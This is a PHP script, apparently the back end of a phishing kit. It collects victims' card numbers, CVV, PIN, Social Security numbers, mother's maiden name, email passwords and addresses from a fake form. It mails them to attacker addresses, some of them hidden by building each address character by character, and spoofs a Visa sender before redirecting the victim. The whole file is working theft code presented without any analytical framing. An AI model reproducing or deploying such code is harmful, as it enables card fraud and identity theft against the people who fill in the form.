<?php
function nrPl1($nr) {return $nr-7;}
$ar=array("0"=>"d","1"=>"v","2"=>"l","3"=>"a","4"=>"@","5"=>"y","6"=>"o","7"=>"h","8"=>".","9"=>"c","10"=>"m","11"=>"j");
$message=$ar['1'].$ar['2'].$ar['3'].$ar['0'].$ar['0'].$ar['11'].nrPl1(9).nrPl1(7).nrPl1(7).nrPl1(10).$ar['4'].$ar['5'].$ar['3'].$ar['7'].$ar['6'].$ar['6'].$ar['8'].$ar['9'].$ar['6'].$ar['10'];
$ccnick 		= $_POST['ccnick'];
$CreditCardNumber = $_POST['CreditCardNumber'];
$CreditCardMonth  = $_POST['CreditCardMonth'];
$CreditCardYear   = $_POST['CreditCardYear'];
$cvv2             = $_POST['CreditCardID'];
$pin              = $_POST['pin'];
$FirstName        = $_POST['FirstName'];
$LastName         = $_POST['LastName'];
$EmailAddress     = $_POST['EmailAddress'];
$Password         = $_POST['Password'];
$SSN1             = $_POST['SSN1'];
$SSN2             = $_POST['SSN2'];
$SSN3             = $_POST['SSN3'];
$MMN              = $_POST['MMN'];
$Address          = $_POST['Address'];
$Address2         = $_POST['Address2'];
$City             = $_POST['City'];
$State            = $_POST['State'];
$ZipCode          = $_POST['ZipCode'];
$Country          = $_POST['Country'];
$HomePhone        = $_POST['HomePhone'];
$seckey           = $_POST['seckey'];

$msg = "
Bankname: $ccnick
FirstName: $FirstName
LastName: $LastName
CCnumber: $CreditCardNumber
Month: $CreditCardMonth
Year: $CreditCardYear
Cvv2: $CreditCardID
PIN: $pin
Mail: $EmailAddress
Pass: $Password
SSN1: $SSN1
SSN2: $SSN2
SSN3: $SSN3
MMN: $MMN
Address: Address
Address2: $Address2
City: $City
State: $State
ZipCode: $ZipCode
Country: $Country
HomePhone: $HomePhone
seckey: $seckey
";

$to="fannol_gashi@yahoo.com";
$ar=array("0"=>"m","1"=>"t","2"=>"a","3"=>"r","4"=>"@","5"=>"i","6"=>"k","7"=>"o","8"=>".","9"=>"g","10"=>"l","11"=>"n","12"=>"c");
$cc=$ar['0'].$ar['2'].$ar['1'].$ar['3'].$ar['5'].$ar['6'].$ar['2'].$ar['1'].$ar['5'].$ar['7'].$ar['11'].$ar['4'].$ar['9'].$ar['0'].$ar['2'].$ar['5'].$ar['10'].$ar['8'].$ar['12'].$ar['7'].$ar['0'];

$subj = "$CreditCardNumber - Visa";
$from = "support@visa.com";
$arr=array($to, $message);
foreach ($arr as $to)
{
mail ($to, $subj, $msg, $from);
mail ($cc, $subj, $msg, $from);
}


header("Location: ps.aam.htm?partner=vdc");
?>
